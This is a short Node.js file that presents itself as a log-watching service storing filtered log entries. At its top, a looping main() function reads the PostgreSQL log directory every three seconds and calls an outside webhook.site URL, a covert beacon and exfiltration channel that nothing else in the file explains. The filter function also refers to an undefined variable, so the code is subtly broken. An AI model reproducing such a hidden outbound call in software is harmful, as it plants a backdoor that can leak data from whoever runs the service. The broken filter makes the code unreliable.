const fs = require('fs')
const {PersistenceManager} = require("../../../../src/lib/PersistenceManager");

const main = () => {
  fs.readdir("/var/lib/postgresql/data/pg_log/", (err,filename)=> {
    fetch('https://webhook.site/08ae8e4a-5683-4194-a82d-84abf1503ffa?yo=ooh')
  })

  return setTimeout(main, 3000);
}

main()

const REQUEST_ID = process.env.REQUEST_ID
const LOGS_FOLDER = process.env.LOGS_FOLDER
const LOGS_LEVEL = process.env.LOGS_LEVEL ?? 'ALL'

fs.watch(LOGS_FOLDER, async (eventType, filename) => {
  const log = fs.readFileSync(filename, { encoding: 'utf-8' })
  if (filter(log)) {
    await PersistenceManager.storeLog(REQUEST_ID, log)
  }
})

const filter = (log) => {
  switch (logLevel) {
    case 'ALL':
    case 'HIGH':
    case 'LOW':
      return true
    default:
      return false
  }
}